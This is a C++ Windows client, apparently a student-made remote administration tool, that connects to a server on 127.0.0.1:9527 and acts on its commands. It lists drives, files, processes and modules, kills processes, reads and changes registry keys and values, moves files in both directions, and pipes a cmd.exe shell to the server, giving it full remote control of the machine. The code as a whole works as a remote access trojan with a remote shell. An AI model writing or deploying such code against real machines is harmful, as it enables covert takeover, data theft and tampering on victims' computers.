#include "CMyClient.h"
//#include <windows.h>
#include <iostream>
CMyClient::CMyClient()
{
    
}

CMyClient::~CMyClient()
{
}


DWORD WINAPI CMyClient::CmdThreadProc(LPVOID lpParameter)
{
    CMyClient* pThis = (CMyClient*)lpParameter;
    SECURITY_ATTRIBUTES sa = { 0 };
    sa.bInheritHandle = TRUE;
    BOOL bRet = ::CreatePipe(
        &pThis->m_hParentRead,
        &pThis->m_hChildWrite,
        &sa,
        0);

    bRet = ::CreatePipe(
        &pThis->m_hChildRead,
        &pThis->m_hParentWrite,
        &sa,
        0);

    //创建子进程
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPTSTR szCmdline = (LPTSTR)("cmd.exe");

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = pThis->m_hChildRead;
    si.hStdOutput = pThis->m_hChildWrite;
    si.hStdError = pThis->m_hChildWrite;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL,
        szCmdline,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &si,
        &pi))
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 0;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    while (true)
    {
        DWORD dwBytesAvail = 0;

        PeekNamedPipe(pThis->m_hParentRead, NULL, 0,
            NULL, &dwBytesAvail, NULL);
        if (dwBytesAvail > 0)
        {
            char* pszBurff = new char[dwBytesAvail + 1]{ 0 };
            DWORD dwBytesRead = 0;
            ReadFile(
                pThis->m_hParentRead,
                pszBurff,
                dwBytesAvail + 1,
                &dwBytesRead,
                NULL);
            //SetDlgItemText(EDT_READ, pszBurff);
            CString BytesRead = pszBurff;
            
            DATAPACKAGE package;
            package.m_hdr.m_nDataType = DT_SEECMD;
            package.m_hdr.m_nDataLen = BytesRead.GetLength() + 1;
            package.m_pBuff = (char*)BytesRead.GetBuffer(0);
            pThis->m_SockClient.SendPackage(&package);



            delete[] pszBurff;
        }
        Sleep(1000);
    }
    return 1;
}

BOOL CMyClient::ConnectServer()
{
    if (!m_SockClient.CreateSocket())
    {
        printf("创建socket失败, 请重试!!");
    }
    BOOL bRet = m_SockClient.Connect("127.0.0.1", 9527);
    CString name = "tchg";
    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_LOGIN;
    package.m_hdr.m_nDataLen = name.GetLength()+1;
    package.m_pBuff = name.GetBuffer();
    m_SockClient.SendPackage(&package);

    InitCmd();

    return bRet;
}

DWORD CMyClient::RecvThread()
{
    while (TRUE)
    {
       

        DATAPACKAGE package = { 0 };
        if (!m_SockClient.RecvPackage(&package))
        {
            //接受失败, 不处理数据, 从新继续接受数据
            continue;
        }
        switch (package.m_hdr.m_nDataType)
        {
        case DT_SEEDISK:
        {
            SendSeeDisk();
            break;
        }
        case DT_SEEFILE:
        {
            CString filepath = package.m_pBuff;
            SendSeeFile(filepath);
            break;
        }
        case DT_UPFILE:
        {
            neb::CJsonObject jsonGet;
            jsonGet.Parse(package.m_pBuff);
            SendUpFile(jsonGet);
            break;
        }
        case DT_DOWNFILE:
        {
            neb::CJsonObject jsonGet;
            jsonGet.Parse(package.m_pBuff);
            SendDownFile(jsonGet);
            break;
        }
        case DT_DOWNFILEOPEN:
        {
            neb::CJsonObject jsonGet;
            jsonGet.Parse(package.m_pBuff);
            SendDownFileOk(jsonGet);
            break;
        }
        case DT_UPFILEOPEN:
        {
            neb::CJsonObject jsonGet;
            jsonGet.Parse(package.m_pBuff);
            SendUpFileOk(jsonGet);
            break;
        }
        case DT_SEEPROCESS:
        {
            SendSeeProcess();
            break;
        }
        case DT_SEETHREAD:
        {
            DWORD pid = atoi(package.m_pBuff);
            SendSeeThread(pid);
            break;
        }
        case DT_STOPPROCESS:
        {
            DWORD pid = atoi(package.m_pBuff);
            SendStopThread(pid);
            break;
        }
        case DT_SEEREGEDIT:
        {
            neb::CJsonObject jsonGet;
            jsonGet.Parse(package.m_pBuff);
            SendSeeRegedit(jsonGet);
            break;
        }
        case DT_ADDREGEDIT:
        {
            neb::CJsonObject jsonGet;
            jsonGet.Parse(package.m_pBuff);
            SendAddRegedit(jsonGet);
            break;
        }
        case DT_ADDREGEDITCL:
        {
            neb::CJsonObject jsonGet;
            jsonGet.Parse(package.m_pBuff);
            SendAddRegeditCl(jsonGet);
            break;
        }
        case DT_DELREGEDIT:
        {
            neb::CJsonObject jsonGet;
            jsonGet.Parse(package.m_pBuff);
            SendDelRegedit(jsonGet);
            break;
        }
        case DT_DELREGEDITVALUE:
        {
            neb::CJsonObject jsonGet;
            jsonGet.Parse(package.m_pBuff);
            SendDelRegeditValue(jsonGet);
            break;
        }
        case DT_SEECMD:
        {
            CString szCmd = package.m_pBuff;
            SendSeeCmd(szCmd);
            break;
        }

        }

        //释放缓冲区
        if (package.m_pBuff != NULL)
        {
            delete[] package.m_pBuff;
            package.m_pBuff = NULL;
        }
    }
}


void CMyClient::SendSeeDisk()
{
    char szBuff[0x100];
    DWORD dwRet = GetLogicalDriveStrings(sizeof(szBuff), szBuff);
    int nNum = 0;
    neb::CJsonObject jsonSend;
    for (int i = 0; i < dwRet; i++)
    {
        int nCount = 1;
        if (szBuff[i] == '\0' && dwRet != i)
        {
            jsonSend.Add(szBuff + nNum);
            nNum = i + 1;
        }
    }
    std::string strText = jsonSend.ToString();

    //发送
    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_SEEDISK;
    package.m_hdr.m_nDataLen = strText.size();
    package.m_pBuff = (char*)strText.c_str();
    m_SockClient.SendPackage(&package);
}


void CMyClient::SendSeeFile(CString& filepath)
{
    // TODO: 在此处添加实现代码.
    CFileFind finder;
    neb::CJsonObject jsonSend;
    BOOL bRet = finder.FindFile(filepath); //查找所有,即是遍历
    int nId = 0;
    while (bRet)
    {
        neb::CJsonObject jsonTmp;
        bRet = finder.FindNextFile();

        CString str;
        int nCount = 1;
        str = finder.GetFileName();
        jsonTmp.Add("Name", str.GetBuffer(0));
        str = finder.GetFilePath();
        jsonTmp.Add("Path", str.GetBuffer(0));
        str = finder.GetFileTitle();

        BOOL bIs = finder.IsArchived();
        bIs = finder.IsDirectory();
        str = bIs ? "1" : "0";
        jsonTmp.Add("IsFile", str.GetBuffer(0));
        bIs = finder.IsDots();
        CTime t;
        finder.GetCreationTime(t);
        CTime tL;
        finder.GetLastWriteTime(tL);
        nId++;
        std::string zz = jsonTmp.ToString();
        jsonSend.Add(jsonTmp);
    }
    std::string cc = jsonSend.ToString();

    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_SEEFILE;
    package.m_hdr.m_nDataLen = cc.size();
    package.m_pBuff = (char *)cc.c_str();
    m_SockClient.SendPackage(&package);
}


void CMyClient::SendSeeProcess()
{
    neb::CJsonObject jsonSend;
    HANDLE hSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS,
        0); //对于遍历进程, 此参数会被忽略

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe))
    {
        do
        {
            neb::CJsonObject jsonTmp;
            CString zz;
            zz.AppendFormat("%d", pe.th32ProcessID);
            jsonTmp.Add("PId", zz.GetBuffer(0));
            jsonTmp.Add("File",pe.szExeFile);
            jsonSend.Add(jsonTmp);
        } while (Process32Next(hSnap, &pe));
    }

    std::string cc = jsonSend.ToString();

    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_SEEPROCESS;
    package.m_hdr.m_nDataLen = cc.size();
    package.m_pBuff = (char*)cc.c_str();
    m_SockClient.SendPackage(&package);
}


void CMyClient::SendSeeThread(DWORD dwpid)
{
    neb::CJsonObject jsonSend;
    HANDLE hModule = CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE,
        dwpid);
    MODULEENTRY32 me;
    me.dwSize = sizeof(me);
    char szIdBuff[0x10] = { 0 };
    char szAddrBuff[0x10] = { 0 };
    int nId = 0;
    if (Module32First(hModule, &me))
    {
        do
        {
            neb::CJsonObject jsonTmp;

            memset(szIdBuff, '\0', 0x10);
            sprintf_s(szIdBuff, "%d", me.th32ProcessID);
            memset(szAddrBuff, '\0', 0x10);
            sprintf_s(szAddrBuff, "%08x", me.modBaseAddr);
            jsonTmp.Add("PId", szIdBuff);
            jsonTmp.Add("ModAddr", szAddrBuff);
            jsonTmp.Add("ModName", me.szModule);
            jsonTmp.Add("Path", me.szExePath);
            jsonSend.Add(jsonTmp);
        } while (Module32Next(hModule, &me));
    }

    std::string cc = jsonSend.ToString();

    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_SEETHREAD;
    package.m_hdr.m_nDataLen = cc.size();
    package.m_pBuff = (char*)cc.c_str();
    m_SockClient.SendPackage(&package);
}


void CMyClient::SendStopThread(DWORD pid)
{
    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_SEEPROCESS;

    CString nRet;

    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess != NULL)
    {
        if (!TerminateProcess(hProcess, 0))
        {
            nRet = "0";
            package.m_hdr.m_nDataLen = nRet.GetLength()+1;
            package.m_pBuff = nRet.GetBuffer(0);
        }
        else
        {
            nRet = "1";
            package.m_hdr.m_nDataLen = nRet.GetLength() + 1;
            package.m_pBuff = nRet.GetBuffer(0);
        }
    }
    
    m_SockClient.SendPackage(&package);
}


void CMyClient::SendSeeRegedit(neb::CJsonObject jsonGet)
{
    HKEY hSubKey = NULL;
    UINT uhkey;
    std::string szpath;
    UINT uItemSel = 0;
    jsonGet.Get("HKEY", uhkey);
    jsonGet.Get("Path", szpath);
    jsonGet.Get("hItem", uItemSel);
    NODEINFO NodeInfo((HKEY)uhkey,
        szpath.c_str());
    
    LONG lRet = RegOpenKey(
        NodeInfo.m_hMainKey,
        NodeInfo.m_strSubKeyPath,
        &hSubKey);

    if (lRet != ERROR_SUCCESS)
    {
        //AfxMessageBox("无法打开此键，请提升为管理员权限。");
        return;
    }

    QueryKey(hSubKey, (HTREEITEM)uItemSel, &NodeInfo);
}

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383
void CMyClient::QueryKey(HKEY hKey, 
    HTREEITEM hParentItem, PNODEINFO pParentNodInfo)
{
    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string 
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys = 0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    nCountOfValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 

    DWORD i, retCode;

    DWORD cchValue = MAX_VALUE_NAME;

    // Get the class name and the value count. 
    retCode = RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // 子键的个数
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &nCountOfValues,                // 键所对应的值的个数
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 

    //遍历键的信息
    if (cSubKeys)
    {
        for (i = 0; i < cSubKeys; i++)
        {
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i,
                achKey,
                &cbName,
                NULL,
                NULL,
                NULL,
                &ftLastWriteTime);
            if (retCode == ERROR_SUCCESS)
            {
                //将遍历的数据添加到树控件
                CString strSubkeyPath;
                if (pParentNodInfo->m_strSubKeyPath == "")
                {
                    strSubkeyPath = achKey;
                }
                else
                {
                    strSubkeyPath = pParentNodInfo->m_strSubKeyPath + "\\" + achKey;
                }

                neb::CJsonObject jsonSend;
                jsonSend.Add("hItem", (UINT)hParentItem);
                jsonSend.Add("HKEY", (UINT)pParentNodInfo->m_hMainKey);
                jsonSend.Add("Path", strSubkeyPath.GetBuffer(0));
                jsonSend.Add("Name", achKey);
                std::string Node = jsonSend.ToString();
                DATAPACKAGE package;
                package.m_hdr.m_nDataType = DT_SEEREGEDIT;
                package.m_hdr.m_nDataLen = Node.size();
                package.m_pBuff = (char*)Node.c_str();
                m_SockClient.SendPackage(&package);   
            }
        }
    }

    //发送清空list
    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_CLEANREGEDITCL;
    package.m_hdr.m_nDataLen = 0;
    package.m_pBuff = NULL;
    m_SockClient.SendPackage(&package);

    ////显示键的值
   
    EnumValues(hKey, nCountOfValues);

}

//数据类型转换
CString CMyClient::RegDataToStr(BYTE* lpData, DWORD lpcbData, int nID)
{
    CString csType = m_szRegType[nID];
    CString csData;
    if (csType == "REG_NONE" || csType == "REG_SZ" || csType == "REG_EXPAND_SZ" || csType == "REG_MULTI_SZ")
    {
        return csData = (char*)lpData;
    }
    else if (csType == "REG_BINARY")
    {
        for (UINT i = 0; i < lpcbData; i++)
        {
            CString cStr;
            cStr.Format("%02x ", lpData[i]);
            csData += cStr;

        }
        return csData;
    }
    else if (csType == "REG_DWORD")
    {
        csData.Format("0x%08x(%d)", *(int*)lpData, *(int*)lpData);
        return csData;
    }
    else
    {
        csData.Format("0x%016I64X(%I64u)", *(__int64*)lpData, *(__int64*)lpData);
        return csData;
    }

}

void CMyClient::EnumValues(HKEY hKey, int nValueCount)
{
    LONG lRet = 0;
    neb::CJsonObject jsonSend;
    // 遍历值的信息
    if (nValueCount)
    {
        for (int i = 0, lRet = ERROR_SUCCESS; i < nValueCount; i++)
        {
            //值的名称
            TCHAR  aryValueNameBuff[MAX_VALUE_NAME];
            DWORD nValueBuffSize = MAX_VALUE_NAME;
            aryValueNameBuff[0] = '\0';

            //值的类型
            DWORD dwValueType = 0;

            //值的数据
            BYTE aryValueValueBuff[MAXWORD];
            DWORD dwValueValueBuffSize = MAXWORD;

            lRet = RegEnumValue(hKey, i,
                aryValueNameBuff,
                &nValueBuffSize,
                NULL,
                &dwValueType,
                aryValueValueBuff,
                &dwValueValueBuffSize);

            if (lRet == ERROR_SUCCESS)
            {
                //发送返回包
                neb::CJsonObject jsonTmp;

                jsonTmp.Add("Name", aryValueNameBuff);
                jsonTmp.Add("RegType", m_szRegType[(int)dwValueType].GetBuffer(0));
                jsonTmp.Add("RegData", RegDataToStr(aryValueValueBuff, dwValueValueBuffSize, dwValueType).GetBuffer(0));

                jsonSend.Add(jsonTmp);
            }
        }
    }

    std::string cc = jsonSend.ToString();
    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_SEEREGEDITCL;
    package.m_hdr.m_nDataLen = cc.size();
    package.m_pBuff = (char*)cc.c_str();
    m_SockClient.SendPackage(&package);
}


void CMyClient::SendAddRegedit(neb::CJsonObject jsonGet)
{
    HKEY hRetKey = NULL;
    HKEY hSubKey = NULL;

    UINT uhkey;
    std::string strName;
    std::string strPath;

    UINT uValue;
    UINT RegType;
    UINT Mhkey;
    UINT uItemSel = 0;
    jsonGet.Get("Name", strName);

    jsonGet.Get("RegType", RegType);

    jsonGet.Get("Mhkey", Mhkey);
    jsonGet.Get("Path", strPath);

    if (ERROR_SUCCESS == RegOpenKey((HKEY)Mhkey,
        strPath.c_str(), &hRetKey))
    {
    
        LONG lRet = RegCreateKey(hRetKey,
            strName.c_str(),
            &hSubKey);
        
        if (lRet != ERROR_SUCCESS)
        {

        }
    }
    RegCloseKey(hRetKey);
}


void CMyClient::SendAddRegeditCl(neb::CJsonObject jsonGet)
{
    HKEY hSubKey = NULL;
    UINT uhkey;
    std::string strName;
    std::string strValue;
    std::string strPath;

    UINT32  uValue;
    UINT RegType;
    UINT Mhkey;
    UINT uItemSel = 0;
    jsonGet.Get("Name", strName);
    
    jsonGet.Get("RegType", RegType);

    jsonGet.Get("Mhkey", Mhkey);
    jsonGet.Get("Path", strPath);

    if (ERROR_SUCCESS == RegOpenKey((HKEY)Mhkey,
        strPath.c_str(), &hSubKey))
    {
        LONG lRet = 0;
        if (RegType == REG_DWORD)
        {
            jsonGet.Get("Value", uValue);
            lRet = RegSetKeyValue(
                (HKEY)Mhkey, //主键
                (LPCSTR)strPath.c_str(), //子键的路径
                strName.c_str(), //值的名称
                RegType, //值的类型
                &uValue, //值的数据所在的缓冲区
                sizeof(uValue)
            );
            /*jsonGet.Get("Value", uValue);
            lRet = RegSetValueExA(hSubKey,
                strName.c_str(), 0, RegType,
                (CONST BYTE*)uValue,
                4);*/
        }
        if (RegType == REG_SZ)
        {
            jsonGet.Get("Value", strValue);
            lRet = RegSetValueEx(hSubKey,
                strName.c_str(), 0, RegType,
                (CONST BYTE*)strValue.c_str(),
                strValue.size());
        }
        
        if (lRet != ERROR_SUCCESS)
        {

        }
    }
    RegCloseKey(hSubKey);
}


void CMyClient::SendDelRegedit(neb::CJsonObject jsonGet)
{
    // TODO: 在此处添加实现代码.
    HKEY hRetKey = NULL;
    HKEY hSubKey = NULL;

    std::string strName;
    std::string strPath;
    UINT Mhkey = 0;
    jsonGet.Get("Name", strName);
    jsonGet.Get("Path", strPath);

    jsonGet.Get("Mhkey", Mhkey);

    if (ERROR_SUCCESS == RegOpenKey((HKEY)Mhkey,
        strPath.c_str(), &hRetKey))
    {
        LONG lRet = RegDeleteKey(hRetKey,
            strName.c_str());
     
        if (lRet != ERROR_SUCCESS)
        {

        }
        int n = 0;
    }
    RegCloseKey(hRetKey);
}


void CMyClient::SendSeeCmd(CString cmd)
{
    WriteToCmd(cmd);
}




void CMyClient::InitCmd()
{
    m_hThread = CreateThread(
        NULL,
        0, //使用默认的栈大小
        CmdThreadProc, //新线程从这个函数开始执行代码
        this, //传给线程回调函数
        0, //线程立即执行
        NULL//不需要传出线程id,此处填空
    );
    if (m_hThread == NULL)
    {
        //AfxMessageBox("创建线程失败");
    }
}


void CMyClient::WriteToCmd(CString cmd)
{
    DWORD dwBytesWrited = 0;
    cmd += "\r\n";
    BOOL bRet = WriteFile(
        m_hParentWrite,
        cmd.GetBuffer(0),
        cmd.GetLength(),
        &dwBytesWrited,
        NULL);
}


void CMyClient::SendDelRegeditValue(neb::CJsonObject jsonGet)
{
    HKEY hRetKey = NULL;
    HKEY hSubKey = NULL;

    std::string strName;
    std::string strPath;
    UINT Mhkey = 0;
    jsonGet.Get("Name", strName);
    jsonGet.Get("Path", strPath);

    jsonGet.Get("Mhkey", Mhkey);

    if (ERROR_SUCCESS == RegOpenKey((HKEY)Mhkey,
        strPath.c_str(), &hRetKey))
    {
        LONG lRet = RegDeleteValue(hRetKey,
            strName.c_str());

        if (lRet != ERROR_SUCCESS)
        {

        }
        int n = 0;
    }
    RegCloseKey(hRetKey);
}


void CMyClient::SendUpFileOk(neb::CJsonObject jsonGet)
{
    std::string DstFilePath;
    UINT64 nFileSize = 0;

    jsonGet.Get("DstPath", DstFilePath);
    jsonGet.Get("FileSize", nFileSize);

    m_hFile = CreateFile(
        DstFilePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    LARGE_INTEGER* pnFileSize = (LARGE_INTEGER*)&nFileSize;
    m_hFileMap = CreateFileMapping(
        m_hFile,
        NULL,
        PAGE_READWRITE,
        pnFileSize->HighPart,
        pnFileSize->LowPart,
        NULL);

    neb::CJsonObject jsonSend;
    UINT64 dwNumberOfBytes = 0;
    jsonSend.Add("Offset", dwNumberOfBytes);
    jsonSend.Add("OffsetSize", 0x1000);
    std::string cc = jsonSend.ToString();

    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_UPFILE;
    package.m_hdr.m_nDataLen = cc.size();
    package.m_pBuff = (char*)cc.c_str();
    m_SockClient.SendPackage(&package);
}


void CMyClient::SendDownFileOk(neb::CJsonObject jsonGet)
{
    std::string SrcFilePath;
    std::string DstFilePath;

    jsonGet.Get("SrcPath", SrcFilePath);
    jsonGet.Get("DstPath", DstFilePath);

    m_hFile = CreateFile(
        SrcFilePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    UINT64 nFileSize = 0;
    GetFileSizeEx(m_hFile, (LARGE_INTEGER*)&nFileSize);
    LARGE_INTEGER* pnFileSize = (LARGE_INTEGER*)&nFileSize;
    m_hFileMap = CreateFileMapping(
        m_hFile,
        NULL,
        PAGE_READWRITE,
        pnFileSize->HighPart,
        pnFileSize->LowPart,
        NULL);

    neb::CJsonObject jsonSend;

    jsonSend.Add("DstPath", DstFilePath);
    jsonSend.Add("Size", nFileSize);
    std::string cc = jsonSend.ToString();

    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_DOWNFILEOPEN;
    package.m_hdr.m_nDataLen = cc.size();
    package.m_pBuff = (char*)cc.c_str();
    m_SockClient.SendPackage(&package);
}


void CMyClient::SendUpFile(neb::CJsonObject jsonGet)
{
    UINT64 nSize = 0;
    UINT dwNumberOfBytes = 0;
    std::string data;
    jsonGet.Get("Size", nSize);
    jsonGet.Get("Offset", dwNumberOfBytes);
    jsonGet.Get("Data", data);

    LARGE_INTEGER* pnSize = (LARGE_INTEGER*)&nSize;
    char* pBuff = (char*)MapViewOfFileEx(
        m_hFileMap,
        FILE_MAP_WRITE | FILE_MAP_READ,
        pnSize->HighPart, pnSize->LowPart,
        dwNumberOfBytes,
        NULL);
    memmove(pBuff, data.c_str(), dwNumberOfBytes);
    UnmapViewOfFile(pBuff);

    neb::CJsonObject jsonSend;
    dwNumberOfBytes += 0x1000;
    jsonSend.Add("Offset", dwNumberOfBytes);

    std::string cc = jsonSend.ToString();

    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_UPFILE;
    package.m_hdr.m_nDataLen = cc.size();
    package.m_pBuff = (char*)cc.c_str();
    m_SockClient.SendPackage(&package);
}


void CMyClient::SendDownFile(neb::CJsonObject jsonGet)
{
    UINT64 nSize = 0;
    UINT64 nFileSize = 0;
    UINT dwNumberOfBytes = 0;
    char* szData = new char[0x1000 + 1]{ 0 };
    std::string data;
    jsonGet.Get("FileSize", nFileSize);
    jsonGet.Get("Offset", nSize);
    jsonGet.Get("OffsetSize", dwNumberOfBytes);

    LARGE_INTEGER* pnSize = (LARGE_INTEGER*)&nSize;
    char* pBuff = (char*)MapViewOfFileEx(
        m_hFileMap,
        FILE_MAP_WRITE | FILE_MAP_READ,
        pnSize->HighPart, pnSize->LowPart,
        nFileSize,
        NULL);
    
    memmove(szData, pBuff, nFileSize);
    UnmapViewOfFile(pBuff);

    data = szData;

    neb::CJsonObject jsonSend;
    dwNumberOfBytes += 0x1000;
    jsonSend.Add("Offset", nSize);
    jsonSend.Add("OffsetSize", nFileSize);
    jsonSend.Add("data", data.c_str());
    std::string cc = jsonSend.ToString();

    DATAPACKAGE package;
    package.m_hdr.m_nDataType = DT_DOWNFILE;
    package.m_hdr.m_nDataLen = cc.size();
    package.m_pBuff = (char*)cc.c_str();
    m_SockClient.SendPackage(&package);

    delete[] szData;
}
